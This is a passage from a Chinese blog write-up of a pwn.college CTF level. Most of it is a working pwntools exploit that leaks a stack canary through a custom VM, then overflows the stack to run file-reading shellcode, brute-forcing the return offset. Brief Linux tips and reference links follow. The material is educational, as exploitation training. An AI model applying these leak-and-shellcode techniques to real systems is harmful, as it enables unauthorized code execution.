class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># shellcode，就是open f 和 sys_sendfile</span><br>shellcode_origin = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov al, 2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rsi, rax</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    mov rcx, 0x1000</span><br><span class="hljs-string">    mov ax, 40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 根据vm的规则设定相应的vm_op(只把用上的给改了，其余没用的就没改)，然后通过get_ins直接获取相应的二进制数</span><br>ID = [<span class="hljs-string">b&#x27;\x01&#x27;</span>, <span class="hljs-string">b&#x27;\x02&#x27;</span>, <span class="hljs-string">b&#x27;\x04&#x27;</span>, <span class="hljs-string">b&#x27;\x08&#x27;</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>, <span class="hljs-string">b&#x27;\x20&#x27;</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>, <span class="hljs-string">b&#x27;\x80&#x27;</span>]<br>vm_op = &#123;<br>    <span class="hljs-string">&#x27;IMM&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;ADD&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;STK&#x27;</span>: ID[<span class="hljs-number">7</span>],<br>    <span class="hljs-string">&#x27;STM&#x27;</span>: ID[<span class="hljs-number">2</span>],<br>    <span class="hljs-string">&#x27;LDM&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;CMP&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;JMP&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;SYS&#x27;</span>: ID[<span class="hljs-number">0</span>],<br><br>    <span class="hljs-string">&#x27;REG_A&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;REG_B&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;REG_C&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;REG_D&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;REG_I&#x27;</span>: ID[<span class="hljs-number">3</span>],<br><br>    <span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>: ID[<span class="hljs-number">3</span>],<br>    <span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>: ID[<span class="hljs-number">1</span>]<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ins</span>(<span class="hljs-params">op, arg1, arg2</span>):<br>    <span class="hljs-keyword">return</span> op + arg2 + arg1<br><br>vm_code = <span class="hljs-string">b&#x27;&#x27;</span><br>offset= <span class="hljs-number">0x100</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 这里通过在栈上观察情况，write出old_rbp，然后read读取payload到内存的某个位置，通过不断爆破得到offset来使ret到payload的位置</span><br>    r = process(binary_paths)<br>    <span class="hljs-comment"># r = gdb.debug(binary_paths[0], &quot;break *0x401D82&quot;)</span><br>    <span class="hljs-comment"># a = write(1, 0xff, 0x68)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c]</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\x68&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#对应的是rsp+0x3d8的位置，也就是这里ins[]数值自动加0x10</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    <span class="hljs-comment"># a = read(0, reg_b, 0xff)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c] -&gt; read_memory</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\xff&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#这里也是+0x10，对应rsp+0x3d8</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    r.send(vm_code)<br>    r.recvuntil(<span class="hljs-string">b&#x27;write\n&#x27;</span>)<br>    <span class="hljs-comment"># 最后获取到的就是old_rsp,这里main存在push rbp和sub rsp,0x420的操作，所以这里的esp+0x428应该是压入的rbp的值，而不是ret</span><br>    <span class="hljs-comment"># 而调用main的start在调用之前进行了push rsp操作，所以栈从高到低为rsp, ret, rbp, 脏数据,cannary。所以显示表格的ret其实是rbp的值。</span><br>    <span class="hljs-comment"># 所以这里构造的0x68最后接收的就是start push的rsp的值，它离main的rbp更近，可以更快得到输入数据的地址</span><br>    ret = r.recv(<span class="hljs-number">0x68</span>)<br>    success(<span class="hljs-string">f&quot;ret: <span class="hljs-subst">&#123;ret&#125;</span>&quot;</span>)<br>    old_rsp = ret[-<span class="hljs-number">8</span>:]<br>    <span class="hljs-comment"># cannary距离old_rsp相差4*0x8距离</span><br>    cannary = ret[-<span class="hljs-number">40</span>:-<span class="hljs-number">32</span>]<br>    success(<span class="hljs-string">f&quot;Old RSP: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(u64(old_rsp))&#125;</span>&quot;</span>)<br>    success(<span class="hljs-string">f&quot;cannary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(u64(cannary))&#125;</span>&quot;</span>)<br>    shellcode = asm(shellcode_origin, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shellcode)]<br>    success(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>    payload = shellcode + (<span class="hljs-number">0x40</span> - <span class="hljs-built_in">len</span>(shellcode)) * p8(<span class="hljs-number">0xff</span>) + p64(u64(cannary)) + p64(<span class="hljs-number">0</span>) + p64(u64(old_rsp) - offset)<br>    r.send(payload)<br>    text = r.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> text:<br>        offset += <span class="hljs-number">8</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Offset:&quot;</span>, offset)<br>        r.close()<br>    <span class="hljs-keyword">else</span>:<br>        success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h1 id="others"><a class="markdownIt-Anchor" href="#others"></a> Others</h1>
<h2 id="tips"><a class="markdownIt-Anchor" href="#tips"></a> tips</h2>
<ul>
<li>linux中的history，可以快速进行命令(方便与gcc那一长串)
<ul>
<li>主要使用 <code>history | grep gcc</code> 来查找之前的命令</li>
<li>也可以使用 <code>ctrl + R</code>，然后开始匹配历史命令，不用输入一长串了</li>
</ul>
</li>
<li>在/opt中存在pwndbg还有一些其他东西，不需要用自己的机器调试了</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://j-shiro.github.io/">参考wp1</a> <a target="_blank" rel="noopener" href="https://www.freebuf.com/author/thundersword">参考wp2</a> <a target="_blank" rel="noopener" href="https://dem0dem0.top/2023/12/06/shellcode_injection/">参考wp3</a> <a target="_blank" rel="noopener" href="https://www.buryia.top/page/2/#content-inner">参考wp4</a></p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn%E7%AC%94%E8%AE%B0/" class="category-chain-item">Pwn笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Pwn.college(2)</div>
      <div>http://example.com/posts/b0a958e2.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Nuthecz</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年2月6日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/posts/a9b269a3.html" title="Pwn.college(3)">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Pwn.college(3)</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/posts/12101e44.html" title="Linux管道机制">
                        <span class="hidden-mobile">Linux管道机制</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>
      目录
    </span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>


  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




   <script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
  var toc = jQuery('#toc');
  if (toc.length === 0 || !window.tocbot) { return; }
  var boardCtn = jQuery('#board-ctn');
  var boardTop = boardCtn.offset().top;

  window.tocbot.init(Object.assign({
  tocSelector : '#toc-body',
  contentSelector : '.markdown-body',
  linkClass : 'tocbot-link',
  activeLinkClass : 'tocbot-active-link',
  listClass : 'tocbot-list',
  isCollapsedClass: 'tocbot-is-collapsed',
  collapsibleClass: 'tocbot-is-collapsible',
  scrollSmooth : true,
  includeTitleTags: true,
  headingsOffset : -boardTop,
  }, CONFIG.toc));
  if (toc.find('.toc-list-item').length > 0) {
  toc.css('visibility', 'visible');
  }

  Fluid.events.registerRefreshCallback(function() {
  if ('tocbot' in window) {
  tocbot.refresh();
  var toc = jQuery('#toc');
  if (toc.length === 0 || !tocbot) {
  return;
  }
  if (toc.find('.toc-list-item').length > 0) {
  toc.css('visibility', 'visible');
  }
  }
  });
  });
  </script>
  

  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
</html>
